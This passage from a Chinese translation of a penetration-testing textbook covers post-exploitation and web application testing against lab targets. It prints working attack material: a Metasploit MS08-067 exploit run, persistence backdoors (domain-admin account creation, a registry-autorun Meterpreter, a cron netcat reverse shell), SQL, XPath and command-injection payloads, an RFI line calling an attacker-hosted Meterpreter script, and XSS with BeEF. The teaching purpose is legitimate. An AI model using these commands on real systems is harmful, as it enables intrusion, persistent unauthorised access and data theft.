  \ `auxiliary/scanner/smb/smb_version` 模块，然后使用 `windows/smb/ms08_067_netapi` 模块配合\
  \ `check` 函数，引导我们通过跳板利用 MS08-067 漏洞攻击 Windows XP 目标。\n\n### 通过跳板执行漏洞\n\n由于我们的 Windows\
  \ XP 和 Kali 系统位于不同的网络，反向有效负载（reverse payload）对我们的漏洞无效，因为 Windows XP 目标不知道如何将流量路由回\
  \ 192.168.20.9。（当然，如果我们的 Kali 系统位于互联网上，且我们攻击的内部网络可以路由到互联网，情况就不同了。然而，在这里我们的主机主机网络不知道如何路由到我们的桥接网络。）相反，我们将使用\
  \ `bind payload`。Metasploit 的绑定处理器（bind handler）将通过通过我们设置的跳板进行路由。`windows/meterpreter/bind_tcp`\
  \ 负载将如示例 13-30 所示正常工作。\n\n示例 13-30. 通过跳板利用漏洞\n\n```\nmsf exploit(handler) > use\
  \ windows/smb/ms08_067_netapi\nmsf exploit(ms08_067_netapi) > set RHOST 172.16.85.190\n\
  rhosts => 172.16.85.190\nmsf exploit(ms08_067_netapi) > set payload windows/meterpreter/bind_tcp\n\
  msf exploit(ms08_067_netapi) > exploit\n[*] 172.16.85.190:25 - TCP OPEN\n[*] 172.16.85.190:80\
  \ - TCP OPEN\n[*] 172.16.85.190:139 - TCP OPEN\n[*] 172.16.85.190:135 - TCP OPEN\n\
  [*] 172.16.85.190:180 - TCP OPEN\n```\n\n\n\n\n\n这只是通过跳板（pivot）运行 Metasploit 外部工具的一种方法。虽然这样做会稍微减慢速度，但能够访问\
  \ Kali 中的其他工具是非常有用的。\n\n### 注意\n\n并不是所有漏洞都能通过跳板进行利用。通常情况下，这取决于漏洞协议的工作原理。另一种可以研究的技术是\
  \ SSH 隧道。更多信息请访问我的博客：[`www.bulbsecurity.com/`](http://www.bulbsecurity.com/)。\n\n\
  ## 持久化 (Persistence)\n\n我们的 Meterpreter 会话的一个大优点也是它的缺点。因为主机进程完全驻留在内存中，如果它崩溃，我们的\
  \ Meterpreter 会话也会随之结束；如果系统重启，我们就会丢失会话。如果我们失去了对目标的网络访问，会话也可能结束。\n\n与其重新利用同一个漏洞或重新发送社会工程学攻击，如果有一种方法可以在未来重新获得访问将是理想的。持久化方法可以简单到向系统添加一个用户，也可以复杂到内核级\
  \ rootkit，这种工具甚至可以从 Windows API 中隐藏自己自己，使其几乎无法被检测。在本节中，我们将介绍几种在目标系统上获取持久化的简单方法，为你的渗透测试提供一个良好的起点。\n\
  \n### 添加用户\n\n获取持久化最简单的方法可能是添加一个新用户。能够通过 SSH、RDP 等直接登录系统，将使得以后访问系统变得容易。（与你在目标上做的所有其他更改一样，请记住在完成渗透测试之前删除任何已添加的用户账户。）\n\
  \n在 Windows 系统上，使用 `net user` `username` `password` `/add` 来添加新用户，所示：\n\n```\nC:\\\
  Documents and Settings\\georgia\\Desktop> net user james password /add\nnet user\
  \ james password /add\nThe command completed successfully.\n```\n\n我们还应该使用 `net\
  \ localgroup` `group username` `/add` 命令将新用户添加到相关组中。例如，如果我们想通过远程桌面登录，应该将用户添加到“远程桌面用户”（Remote\
  \ Desktop Users）组。如所示，“管理员”（Administrators）组也是一个将我们的用户添加其中的好组。\n\n```\nC:\\Documents\
  \ and Settings\\georgia\\Desktop> net localgroup Administrators james /add\nnet\
  \ localgroup Administrators james /add\nThe command completed successfully.\n```\n\
  \n如果你的客户有 Windows 域，你可以通过在命令末尾加上 `/domain` 将用户添加到域并添加到域组中（如果你有足够的权限）。例如，如果你能够窃取域管理员的令牌，可以使用以下命令添加域管理员账户，从而获得对整个域的完全控制。\n\
  \n```\nC:\\Documents and Settings\\georgia\\Desktop> net user georgia2 password\
  \ /add /domain\nC:\\Documents and Settings\\georgia\\Desktop> net group \"Domain\
  \ Admins\" georgia2 /add /domain\n```\n\n在 Linux 目标系统上，我们可以使用 `adduser` 来添加用户账户。理想情况下，我们还应该将新用户添加到\
  \ sudoers 组，以便我们拥有 root 权限。\n\n### Metasploit 持久化\n\nMeterpreter 脚本 `persistence`\
  \ 自动化创建一个创建一个 Windows 后门，根据我们创建它时使用的选项，该后门将在启动、登录等时候自动连接回 Metasploit 监听器。`persistence`\
  \ 脚本的选项所示示例 13-33。\n\n示例 13-33. Meterpreter 持久化脚本\n\n```\nmeterpreter > run persistence\
  \ -h\nMeterpreter 用于在目标主机上创建持久化后门的脚本。\n\nOPTIONS:\n\n    -A        自动启动一个匹配的 multi/handler\
  \ 来连接代理(agent)\n    -L <opt>  目标主机上写入 payload 的位置，如果没有指定则将使用 %TEMP%。\n    -P <opt>\
  \  使用的 payload，默认是 windows/meterpreter/reverse_tcp。\n    -S        在启动机时作为服务自动启动代理（具有\
  \ SYSTEM 权限）\n    -T <opt>  要使用的备用可执行文件模板\n    -U        在用户登录时自动启动代理\n    -X  \
  \      在系统启动时自动启动代理\n    -h        显示此帮助菜单\n    -i <opt>  每次连接尝试之间的间隔时间（秒）\n   \
  \ -p <opt>  Metasploit 监听的远程主机端口\n    -r <opt>  运行 Metasploit 监听器并等待回连的系统 IP\n```\n\
  \n如你所见，我们的持久化 payload 有许多自定义选项。我们可以让持久化代理在启动机时或用户登录时启动。我们可以设置连接到 handler 尝试之间的间隔。我们可以更改代理在目标系统上的写入位置。我们还可以指定代理连接回的远程主机和端口。我们甚至可以让\
  \ Metasploit 自动设置一个 handler 来捕获接入连接。在设置持久化的过程中，Metasploit 必须将持久化代理写入磁盘，因此此时 Meterpreter\
  \ 不再完全驻留在内存中。当持久化代理在启动运行时（`-X`），一个 Visual Basic 脚本会被上传到 `%TEMP%` 文件夹，并且注册表项会被启动程序列表中。当持久化代理在登录运行时（`-U`），过程类似，但注册表项被设置为登录时运行。当持久化代理作为服务运行时（`-S`），会创建一个\
  \ Windows 系统服务，该服务将调用 `%TEMP%` 下的 Visual Basic 脚本。\n\n让我们运行 `persistence` 脚本，所示示例\
  \ 13-34，告诉代理在用户登录时连接回我们的 Kali 机器。\n\n示例 13-34. 运行持久化脚本\n\n```\nmeterpreter > run\
  \ persistence -r 192.168.20.9 -p 2345 -U\n[*] Running Persistence Script\n[*] Resource\
  \ file for cleanup created at /root/.msf4/logs/persistence/BOOKXP_20150814.1154/BOOKXP_20150814.1154.rc\n\
  [*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=192.168.20.9 LPORT=2345\n\
  [*] Persistent agent script is 614853 bytes long\n[+] Persistent Script written\
  \ to C:\\WINDOWS\\TEMP\\eTuUwezJblFHz.vbs\n[*] Executing script C:\\WINDOWS\\TEMP\\\
  eTuUwezJblFHz.vbs\n[+] Agent executed with PID 840\n[*] Installing into autorun\
  \ as HKLM\\Software\\Windows\\CurrentVersion\\Run\\BJkGfhXD\n[+] Installed into\
  \ autorun as HKLM\\Software\\Windows\\CurrentVersion\\Run\\BJkGfhXD\n```\n\n在运行脚本后，使用\
  \ Meterpreter 命令 `background` 将会话放入后台，并设置一个 handler 来捕获接入连接。现在重启 Windows XP 目标。重启后，以\
  \ `georgia` 登录，你应该收到另一个 Meterpreter 会话。\n\n### 注意\n\n如果第一次没有成功，请尝试重启并重新登录。\n\n###\
  \ 创建 Linux cron 任务\n\n在 Windows 和 Linux 系统上，我们都可以指定时间自动启动任务。例如，我们可以设置 `cron` 任务自动运行\
  \ Metasploit payload，甚至只需使用 Netcat 连接回我们。\n\n在 Linux 目标上打开 `/etc/crontab`。以下行将在每小时的每\
  \ 10 分钟、每天、每月运行 `nc 192.168.20.9 12345 -e /bin/bash` 命令一次。该命令将以 root 身份运行。将此行添加到\
  \ `/etc/crontab` 文件的末尾。（需要帮助，请参见使用 cron 自动化任务。）\n\n```\n*/10 * * * * root nc 192.168.20.9\
  \ 12345 -e /bin/bash\n```\n\n现在通过输入 `service cron restart` 重启 `cron` 服务。在你的 Kali\
  \ 机器的端口 12345 上设置 Netcat 监听器，在下一个十分钟，`cron` 任务就会运行，你应该会在你的 Netcat 监听器上收到一个 root\
  \ shell。\n\n\n\n\n\n在本章中，我们只涵盖了少数几种后利用技术，仅仅触及了可用的大量有趣工具和技术的皮毛。我们查看了一些在受攻击系统上提升权限的方法。我们还查看了收集本地信息的方法。我们研究了如何将对一个系统的访问转换为对多个系统的访问，包括通过打开会话从一个网络跳转到另一个网络。最后，我们查看了两种让访问持久化的方法。\n\
  \n# 第 14 章 Web 应用程序测试\n\n尽管自动化扫描器在发现 Web 应用程序已知漏洞方面表现出色，但许多客户会构建自定义的 Web 应用程序。诚然，商业产品可以针对自定义\
  \ Web 应用程序中的用户输入字段自动化攻击，但在发现这些应用程序的安全问题时，没有任何可以替代带有代理工具的优秀渗透测试员。\n\n与所有软件一样，当输入未经过妥善清理时，Web\
  \ 应用程序可能会出现问题。例如，当应用程序根据某些用户输入从数据库提取数据时，应用程序可能期望特定的输入，如用户名和密码。相反，如果用户输入特殊内容来创建额外的数据库查询，他们可能能够从数据库中窃取数据、绕过验证，甚至在底层系统上执行命令。\n\
  \n在本章中，我们将通过安装在 Windows 7 目标上的示例 Web 应用程序来寻找 Web 应用程序中的一些常见漏洞：这是一个带有 Web 应用程序中常见的几个安全问题的简单书商店。（安装说明请参见安装额外软件）。\n\
  \n## 使用 Burp Proxy（代理）\n\n我们可以使用代理来捕获浏览器与 Web 应用程序之间的请求和响应，这样我们就能就能确切看到传输了哪些数据。Kali\
  \ Linux 附带免费版本的 Burp Suite，这是一个用于 Web 应用程序的测试平台，包含代理功能。Burp 还包含其他实用组件，例如可以爬取 Web\
  \ 应用程序内容和功能的 Burp Spider（爬虫），以及 Burp Repeater（重放器），后者允许你操纵并重新发送到服务器的请求。现在，我们将重点关注\
  \ Burp Proxy 选项卡。\n\n为了在 Kali Linux 中启动 Burp Suite，转到 Kali GUI 左上角的 Applications（应用程序），然后点击\
  \ `Kali Linux` ▸ `Web Applications`（Web 应用程序） ▸ `Web Application Fuzzers`（Web 应用程序模糊器）\
  \ ▸ `burpsuite`，如图图 14-1 所示。\n\n![在 Kali 中启动 Burp Suite](img/httpatomoreillycomsourcenostarchimages2030426.png.jpg)图\
  \ 14-1. 在 Kali 中启动 Burp Suite\n\n点击 Proxy 选项卡，如图图 14-2 所示。默认情况下，应选中 `Intercept is\
  \ on`（拦截开启）按钮，这样 Burp Suite 就会拦截并拦截任何配置使用 Burp 作为 Web 流量代理的浏览器发出的外部请求。此设置将允许我们在请求发送到服务器之前看到甚至修改\
  \ Web 请求的细节。\n\n![Burp Proxy 界面](img/httpatomoreillycomsourcenostarchimages2030428.png.jpg)图\
  \ 14-2. Burp Proxy 界面\n\n现在我们需要告诉 Kali Linux 中的浏览器通过 Burp Suite 代理 Web 流量。\n\n1.\
  \ 打开 Iceweasel 浏览器，进入 `Edit`（编辑） ▸ `Preferences`（首选项） ▸ `Advanced`（高级），并选择 `Network`（网络）选项卡。\n\
  2. 点击 Connection（连接）右侧的 `Settings`（设置）。\n3. 在连接设置对话框（如图图 14-3）中，选择 `Manual proxy\
  \ configuration`（手动代理配置），并输入 IP 地址 `127.0.0.1` 和端口 `8080`。这告诉 Iceweasel 通过端口 `8080`\
  \ 的本地主机代理流量，这是 Burp Proxy 的默认端口。\n\n![在 Iceweasel 中设置代理](img/httpatomoreillycomsourcenostarchimages2030430.png.jpg)图\
  \ 14-3. 在 Iceweasel 中设置代理\n\n为了确保 Iceweasel 将我们的所有流量通过 Burp Suite 代理，请访问 Windows\
  \ 7 目标上的 URL `bookservice`：`[`192.168.20.12/bookservice`](http://192.168.20.12/bookservice)`。\n\
  \n连接在浏览器中似乎挂起了，并且当 Burp Proxy 捕获对 bookservice 站点主页的 `HTTP GET` 请求时，浏览器和 Burp Suite\
  \ 都会亮起，如图图 14-4 所示。\n\n![捕获的 HTTP GET 请求](img/httpatomoreillycomsourcenostarchimages2030432.png.jpg)图\
  \ 14-4. 捕获的 `HTTP GET` 请求\n\n我们可以看到 `HTTP GET` 请求的细节，它向服务器请求 bookservice Web 页面。\n\
  \n正如我们之后看到的，我们可以在请求发送到服务器之前对其进行更改，但现在，让我们点击 `Forward`（转发）按钮继续请求（以及任何后续请求）。返回浏览器，我们看到服务器已向我们发送了\
  \ bookservice 站点的主页，如图图 14-5 所示。\n\n![Bookservice 站点](img/httpatomoreillycomsourcenostarchimages2030434.png.jpg)图\
  \ 14-5. Bookservice 站点 \n\n接下来让我们尝试注册一个账户（见图 14-6）。点击页面左上角的 `Login`（登录），然后从代理转发请求。通过点击\
  \ `New User`（新用户）进入注册页面，并将请求转发到服务器。\n\n![注册新账户](img/httpatomoreillycomsourcenostarchimages2030436.png.jpg)图\
  \ 14-6. 注册新账户\n\n输入用户名、密码和电子邮件，然后点击 `Go` 提交请求。请求应该会被 Burp Proxy 捕获，如图图 14-7 所示。\n\
  \n![捕获的请求](img/httpatomoreillycomsourcenostarchimages2030438.png.jpg)图 14-7. 捕获的请求\n\
  \n除了查看不利于阅读的原始请求外，你还可以点击 Burp Suite 请求窗口顶部的 `Params`（参数）选项卡，以更易读的格式显示请求参数，如图图 14-8\
  \ 所示。\n\n![请求参数](img/httpatomoreillycomsourcenostarchimages2030440.png.jpg)图 14-8.\
  \ 请求参数\n\n例如，新显示了 `User` 字段 `georgia`、`Pass` 字段 `password` 以及 `Email` 字段 `georgia@bulbsecurity.com`。\n\
  \n你可以直接在代理中更改这些字段。例如，如果在将请求转发到服务器之前将 `georgia` 的密码更改为 `password1`，服务器会将 `georgia`\
  \ 的密码设置为 `password1`，因为服务器从未见过浏览器请求 `password` 的原始请求。\n\n代理允许你查看发送到服务器的任何请求的细节。如果在某处不需要代理流量，点击\
  \ `Intercept is on` 将其切换为 `Intercept is off`，允许流量在无需用户交互的情况下通过到达服务器。如果你想捕获特定的请求，将按钮切回。\n\
  \n## SQL 注入\n\n许多 Web 应用程序数据存储在后端的 SQL 数据库中。例如，我们在网络渗透测试期间遇到了 SQL 数据库，当时通过 Windows\
  \ XP 目标上 XAMPP 安装中的 phpMyAdmin 发现开放的 MySQL 数据库（利用开放的 phpMyAdmin）。然后我们使用一个 SQL 查询向\
  \ Web 服务器写入了一个简单的 PHP 命令 shell。\n\n\n\n\n\n我们通常无法从 Web 应用直接对网站后端数据库运行 SQL 查询。然而，如果开发者在与数据库交互时未能对用户输入进行过滤，你可能会发现可以通过执行`SQL\
  \ 注入攻击`来操纵发送到数据库的查询。成功的 SQL 注入攻击可以从数据库读取数据、修改数据、关闭或破坏数据库，在某些情况下，甚至可以在底层操作系统上运行命令（这可能特别强大，因为数据库服务器通常以特权用户身份运行）。\n\
  \n寻找 SQL 注入问题的自然位置是登录页面。许多 Web 应用在数据库中存储用户数据，因此我们可以使用 SQL 查询根据用户提供的用户名和密码来提取出正确的用户。当开发者没有对用户输入进行过滤时，我们就可以构建\
  \ SQL 查询来攻击数据库。这里展示了一个攻击者可以利用的可注入 SQL 语句示例：\n\n```\nSELECT id FROM users WHERE \
  \ username='$username' AND password='$password';\n```\n\n如果攻击者提供的用户名是 `'’ OR ’1’=’1`，且用户的密码也是\
  \ `'’ OR ’1’=’1` 呢？SQL 语句将变为：\n\n```\nSELECT username FROM users WHERE username=''\
  \ or '1'='1' AND password='' or '1'='1'\n```\n\n因为 `OR ’1’=’1’` 始终为真，这条 `SELECT`\
  \ 语句现在将返回用户表中的第一个用户名，无论用户名和密码是什么。\n\n正如我们在 XPath 注入 中看到的，我们的应用程序使用了 XPath（这是一种用于\
  \ XML 文档的查询语言），它针对 XML 文件而非数据库进行身份验证，尽管注入过程相似。然而，我们的应用程序确实使用 SQL 数据库来存储商店可用书籍的记录，当我们在主页上选择一本书时，其详细信息是从\
  \ MS SQL 后端数据库中提取的。例如，点击网站上第一本书《Don’t Make Me Think*》的 `More Details` 链接。请求的 URL\
  \ 为：\n\n```\nhttp://192.168.20.12/bookservice/bookdetail.aspx?id=1\n```\n\n书籍的详细信息是根据\
  \ ID 为 `1` 的记录数据库查询返回的结果填充的。\n\n### 测试 SQL 注入漏洞\n\n测试 SQL 注入漏洞的典型第一个测试是使用单引号来关闭\
  \ SQL 查询。如果存在 SQL 注入漏洞，添加该引号将导致应用程序抛出 SQL 错误，因为查询作为底层代码的一部分已经关闭，而额外的单引号会导致 SQL 语法不正确。该错误将告诉我们，可以使用\
  \ `id` 参数向网站数据库注入 SQL 查询。\n\n让我们尝试再次通过 `id` 参数向 `1’` 发送查询，如下所示。\n\n```\nhttp://192.168.20.12/bookservice/bookdetail.aspx?id=1'\n\
  ```\n\n如所预期，应用程序显示了一个错误页面，表明我们的 SQL 语法错误，如 图 14-9 所示。\n\n![识别出 SQL 错误。](img/httpatomoreillycomsourcenostarchimages2030442.png.jpg)图\
  \ 14-9。应用程序识别出 SQL 错误。\n\n特别注意我们 SQL 查询中的信息“Unclosed quotation mark after the character\
  \ string”（字符字符串后缺少未关闭的引号）。\n\n### 注意事项\n\n并非所有受 SQL 注入影响的应用程序都会如此详细地显示错误信息。事实上，存在一整类盲\
  \ SQL 注入漏洞，在这种情况下，尽管漏洞仍然存在，但不会显示详细的注入错误信息。\n\n### 利用 SQL 注入漏洞\n\n现在我们已经知道该网站存在 SQL\
  \ 注入漏洞，可以利用它在数据库上运行开发者从未意图运行的额外查询。例如，我们可以通过以下查询找到第一个数据库名称：\n\n```\nhttp://192.168.20.12/bookservice/bookdetail.aspx?id=2\
  \ or 1 in (SELECT DB_NAME(0))--\n```\n\n该查询抛出一个错误信息 `Conversion failed when converting\
  \ the nvarchar value ‘BookApp’ to data type int`（将 nvarchar 值‘BookApp’转换为数据类型 int\
  \ 失败），这告诉我们第一个数据库的名称是 BookApp，如 图 14-10 所示。\n\n![显示数据库名称的错误信息](img/httpatomoreillycomsourcenostarchimages2030444.png.jpg)图\
  \ 14-10。显示数据库名称的错误信息\n\n### 使用 SQLMap\n\n我们还可以使用工具自动生成 SQL 查询，以通过 SQL 注入在网站上执行各种任务。我们只需要一个注入点；工具会完成其余工作。例如示例\
  \ 14-1 展示了当我们给 Kali 中的 SQLMap 工具一个潜在的可注入 URL 时，SQLMap 如何测试 SQL 注入漏洞并执行注入查询。\n\n\
  示例 14-1。使用 SQLMap 导出数据库\n\n```\nroot@kali:~# sqlmap -u❶ \"http://192.168.20.12/bookservice/bookdetail.aspx?id=2\"\
  \ --dump❷\n--snip--\n[21:18:10] [INFO] GET parameter 'id' is 'Microsoft SQL Server/Sybase\
  \ stacked queries' injectable\n--snip--\nDatabase: BookApp\nTable: dbo.BOOKMASTER\n\
  [9 entries]\n+--------+---------------++-------+-----------------------------\n\
  | BOOKID | ISBN          | PRICE | PUBNAME                     | FILENAME   | AUTHNAME\
  \ | DESCRIPTION               |\n+--------+---------------++-------+-----------------------------\n\
  | 1      | 9780470412343 | 11.33 | Que;1st edition (October 23 | 4189W8B2NXL.jpg\
  \ | Steve Krug | All of the tips\n...\n```\n*(注：此处示例代码块内容较长，已根据要求不翻译代码块内容)*\n\n\n\
  \n\n\n无论如何，MS SQL 数据库都没有在端口监听，因此我们无法直接访问它。与我们在第 6 章中的 Windows XP 系统不同，此 Web 服务器缺少\
  \ `phpMyAdmin`，因此我们没有其他方式访问数据库。托管网站上的 SQL 注入问题为我们全系统访问权限。\n\n## XPath 注入\n\n如前所述，该图书服务应用使用\
  \ XML 身份验证，其中 XML 使用 `XPath` 进行查询。我们可以使用 `XPath 注入` 来攻击 XML。尽管它的语法与 SQL 不同，但注入过程是相似的。\n\
  \n例如，尝试在登录页的用户名和密码字段中都输入单引号（`'`）。你应该会收到一个类似于图 14-11 所示的错误。\n\n![登录时的 XML 错误](img/httpatomoreillycomsourcenostarchimages2030446.png.jpg)图\
  \ 14-11. 登录时的 XML 错误\n\n正如你从图 14-11 所示的错误消息看到的，我们再次遇到了注入问题，因为我们的语法存在错误。由于我们处于登录页面，XPath\
  \ 的典型注入策略是尝试通过攻击 XPath 查询逻辑来绕过身份验证并获得对已验证部分的访问权限。\n\n例如，错误详情所示，登录查询获取提供的用户名和密码，然后将提供的值与\
  \ XML 文件中的凭据进行比较。我们能创建一个查询来跳过对有效凭据的需求吗？在登录时输入一组虚拟凭据，并使用 Burp Proxy 捕获请求，如图 14-12\
  \ 所示。\n\n现在将捕获请求中的 `txtUser` 和 `txtPass` 参数更改为此值。\n\n```\n' or '1'='1\n```\n\n![捕获的登录请求](img/httpatomoreillycomsourcenostarchimages2030448.png.jpg)图\
  \ 14-12. 捕获的登录请求\n\n这告诉登录 XPath 查询寻找用户名和密码字段为空或为 `1=1` 的用户账户。因为 `1=1` 始终评估为真，此查询的逻辑是返回用户名为空或存在的用户——密码也是如此。因此，使用这种注入方法，我们可以让应用程序以身份验证文件中第一个用户的身份登录。并且，如图\
  \ 14-13 所示，我们以用户 `Mike` 的身份登录了。\n\n![通过 XPath 注入绕过身份验证](img/httpatomoreillycomsourcenostarchimages2030450.png.jpg)图\
  \ 14-13. 通过 XPath 注入绕过身份验证\n\n## 本地文件包含\n\nWeb 应用中常见的另一种漏洞是`本地文件包含`（local file inclusion），它能够从应用程序或文件系统的其他部分读取我们不应通过\
  \ Web 应用程序访问的文件。我们在第 8 章中见过这种方面的例子，Windows XP 目标上的 Zervit Web 服务器允许我们从目标下载文件，例如\
  \ SAM 和 SYSTEM 注册表类的备份。\n\n我们的图书服务应用也受到本地文件包含的影响。作为用户 `Mike`，进入 **Profile**（配置）▸\
  \ **View Newsletters**（查看通讯）。点击列表中的第一份通讯以查看文件内容，如图 14-14 所示。\n\n![查看通讯](img/httpatomoreillycomsourcenostarchimages2030452.png.jpg)图\
  \ 14-14. 查看通讯\n\n现在重新发送请求并用 Burp Proxy 捕获，如图 14-15 所示。\n\n![捕获的通讯请求](img/httpatomoreillycomsourcenostarchimages2030454.png.jpg)图\
  \ 14-15. 捕获的通讯请求\n\n点击 **Params**（参数）选项卡，注意参数 `c:\\inetpub\\wwwroot\\Book\\NewsLetter\\\
  Mike@Mike.com\\Web Hacking Review.txt`。路径 `c:\\inetpub\\wwwroot\\Book\\NewsLetter\\\
  Mike` 表明通讯功能正在通过绝对路径从本地文件系统拉取通讯。看起来 `Newsletter` 文件夹中还有一个名为 `Mike@Mike.com` 的文件夹。也许每个订阅通讯的用户都有这样一个文件夹。\n\
  \n看起来似乎正如通讯请求中所注的，我们的应用程序实际路径位于 `c:\\inetpub\\wwwroot\\Book`，而不是我们可能从 URL 中预期的那样的\
  \ `c:\\inetpub\\wwwroot\\bookservice`。我们注意到这一点是因为它在以后可能会有用。\n\n如果我们把文件名参数更改为应用程序中的另一个文件会怎样？\n\
  \n```\nC:\\inetpub\\wwwroot\\Book\\Search.aspx\n```\n\n## 远程文件包含\n\n远程文件包含（RFI）漏洞允许攻击者在漏洞服务器上加载并执行托管在其他处的恶意脚本。在第\
  \ 8 章中，我们使用 XAMPP 中开放的 phpMyAdmin 接口向 Web 服务器上写入了一个简单的 PHP Shell 以及 PHP 版本的 Meterpreter。虽然我们在这里没有向服务器上传文件，但攻击原理是相似的。如果我们能欺骗漏洞服务器执行远程脚本，就可以在底层系统上运行命令。\n\
  \n\n\n\n\n我们的站点并没有远程文件包含（RFI）漏洞，但这里展示了一个简单的易受攻击 PHP 代码作为说明。\n\n```php\n<?php\ninclude($_GET['file']);\n\
  ?>\n```\n\n攻击者可以在其 Web 服务器上托管一个恶意的 PHP 脚本（例如我们在第 8 章）中使用的 `meterpreter.php` 脚本），并请求一个\
  \ `file` 参数设置为 `[`<attacker_ip>/meterpreter.php`](http://%3Cattacker_ip%3E/meterpreter.php)`\
  \ 的页面。RFI 漏洞会导致 Web 服务器执行 `meterpreter.php`，即使它托管在其他地方。理而易见，我们的示例应用程序是 ASP.net 而不是\
  \ PHP，但 `Msfvenom` 可以为此类应用创建 ASPX 格式的有效负载。\n\n## 命令执行\n\n如前所述，`Newsletters` 文件夹包含一个名为\
  \ `Mike@Mike.com` 的文件夹。从逻辑上讲，这表明该站点可能包含所有注册订阅时事的用户电子邮件地址的类似文件夹。应用程序的某部分在用户注册或订阅时必须正在创建这些文件夹。应用程序的代码可能正在运行一个在文件系统上创建文件夹的命令。也许，同样由于缺乏输入验证，我们可以运行开发者从未意过让我们运行的额外命令。\n\
  \n如图 14-18 所示，Web 应用程序的右下角包含一个订阅时事通讯的表单。我们怀疑当我们输入电子邮件地址时，`newsletters` 文件夹中会为该电子邮件地址创建一个文件夹。\n\
  \n我们猜测电子邮件地址输入被传递给系统命令，以便在 `newsletters` 文件夹中创建目录。如果开发者没有对用户输入进行适当清理，我们可能可以使用取符号符号（`&`）来运行额外的命令。\n\
  \n![Newsletter Signup](img/httpatomoreillycomsourcenostarchimages2030460.png.jpg)图\
  \ 14-18. 时事通讯订阅\n\n我们将执行一个命令并将其输出到应用程序 `C:\\inetpub\\wwwroot\\Book\\*` 目录下的一个文件中，然后直接访问文件以查看命令输出。在\
  \ Windows 7 目标机器上运行所示的 `ipconfig` 命令，将系统命令 `ipconfig` 的输出重定向到 `Book` 目录下的文件 `test.txt`。\n\
  \n```\ngeorgia@bulbsecurity.com & ipconfig > C:\\inetpub\\wwwroot\\Book\\test.txt\n\
  ```\n\n当我们浏览到 `[`192.168.20.12/bookservice/test.txt`](http://192.168.20.12/bookservice/test.txt)`\
  \ 时，我们看到了 `ipconfig` 命令的输出，如图 14-19 所示。\n\n![Command execution output](img/httpatomoreillycomsourcenostarchimages2030462.png.jpg)图\
  \ 14-19. 命令执行输出\n\n我们的权限受到 Internet 信息 Services (IIS) 用户的限制。遗憾于我们的是，Windows 7 系统上的\
  \ Microsoft IIS 应用程序以独立账户运行，不具有系统用户的完整权限：这对于开发者来说是一个更安全的场景，但对我们来说更具挑战性。\n\n尽管我们没有完全访问权限，但我们仍然可以通过现有权限收集有关系统的大量信息。例如，我们可以使用\
  \ `dir` 命令查找感兴趣的文件，或者使用 `netsh advfirewall firewall show rule name=all` 命令查看 Windows\
  \ 防火墙中的规则。\n\n由于我们处于 Windows 系统上，我们无法从命令行使用 `wget` 下载交互式 shell，但可以使用其他各种方法来实现。在第\
  \ 8 章中，我们使用 TFTP 从 Kali 系统传输 shell 到 Windows XP 目标机器。Windows 7 默认没有安装 TFTP 客户端，但在\
  \ Windows 7 中我们有一个名为 `Powershell` 的强大脚本语言，可以用它执行下载和执行文件等任务。\n\n### 注意\n\n对 `Powershell`\
  \ 的研究超本书的范围，但它对最新 Windows 操作系统的漏洞利用非常有帮助。可以在这里找到很好的参考：`[`www.darkoperator.com/powershellbasics/`](http://www.darkoperator.com/powershellbasics/)。\n\
  \n## 跨站脚本\n\n最常见且最受争议的 Web 安全漏洞可能是跨站脚本（XSS）。当存在此类漏洞时，攻击者可以将恶意脚本注入到原本无害的站点中，并在用户的浏览器中执行。\n\
  \nXSS 攻击通常分为两类：存储型反射型。`存储型 XSS 攻击`存储在服务器上，每当用户访问存储脚本的页面时就会执行。用户论坛、评论以及其他用户可以保存显示给其他用户的输入的地方是此类攻击的理想去处。`反射型\
  \ XSS 攻击`不存储在服务器上，而是通过发送包含 XSS 攻击本身的请求创建的。当用户输入包含在服务器的响应中就会发生攻击，例如在错误消息或搜索结果中。\n\
  \n反射型 XSS 攻击依赖于用户发送包含 XSS 攻击的请求。事实上，拥有 XSS 可能会增加社交工程攻击的成功率，因为你可以构造一个真实网站的一部分的 URL——用户知道并信任的网站——并利用\
  \ XSS 将用户重定向到恶意页面（例如）。\n\n### 检查反射型 XSS 漏洞\n\n我们应该检查任何用户输入是否存在 XSS 漏洞。我们会发现我们的应用程序在搜索功能中存在反射型\
  \ XSS 漏洞。尝试在 Books 框中搜索 `xss`，如图 14-20 所示。\n\n如图 14-21 所示，搜索结果页会将原始用户输入作为结果的一部分打印。如果用户输入没有经过适当清理，这可能是我们使用\
  \ XSS 的地方。\n\n![Search function](img/httpatomoreillycomsourcenostarchimages2030464.png.jpg)图\
  \ 14-20. 搜索功能![Search results page](img/httpatomoreillycomsourcenostarchimages2030466.png.jpg)图\
  \ 14-21. 搜索结果页\n\n通常的第一个 XSS 测试是运行 JavaScript 警告框。以下代码将尝试弹出一个带有 `xss` 文字的 JavaScript\
  \ 警告。如果用户输入没有经过适当过滤，脚本将作为搜索结果页的一部分执行。\n\n```\n<script>alert('xss');</script>\n```\n\
  \n在某些情况下，用户的浏览器会自动阻止此类明显的 XSS 攻击，Iceasel 就是其中一个浏览器。切换到带有 Internet Explorer 的 Windows\
  \ 7 目标机器。如图 14-22 所示，弹出警告脚本执行了。\n\n![XSS pop-up](img/httpatomoreillycomsourcenostarchimages2030468.png.jpg)图\
  \ 14-22. XSS 弹出\n\n确定存在反射型 XSS 后，我们可以尝试利用它攻击用户。常见的攻击包括窃取会话 Cookie 发送到攻击者控制的站点，或者嵌入框架（将\
  \ HTML 页面分成不同部分的方法）来提示用户输入凭据。用户可能会认为框架是原始页面的一部分并输入其凭据，这些凭据随后会被发送到外部攻击者处。\n\n\n\n\
  \n\nXSS 漏洞往往被忽视。一个显示“XSS”的警报框能造成多大伤害呢？利用 XSS 漏洞并发现其真实攻击能力的有力工具是浏览器漏洞利用框架（BeEF）。使用\
  \ BeEF，我们可以通过欺骗用户访问我们的 BeEF 服务器来“钩住”浏览器，或者更好，是在存在像之前讨论过的这类 XSS 漏洞时，将 BeEF 的 JavaScript\
  \ 钩子作为载荷。\n\n现在切换目录到 `/usr/share/beef-xss`，并运行 `./beef`，如示例 14-3 所示。这将启动 BeEF 服务器，包括\
  \ Web 界面和攻击钩子。\n\n### 示例 14-3. 启动 BeEF\n\n```\nroot@kali:~# cd /usr/share/beef-xss/\n\
  root@kali:/usr/share/beef-xss# ./beef\n[11:53:26][*] Bind socket [imapeudora1] listening\
  \ on [0.0.0.0:2000].\n[11:53:26][*] Browser Exploitation Framework (BeEF) 0.4.4.5-alpha\n\
  --snip--\n[11:53:27][+] running on network interface: 192.168.20.9\n[11:53:27] \
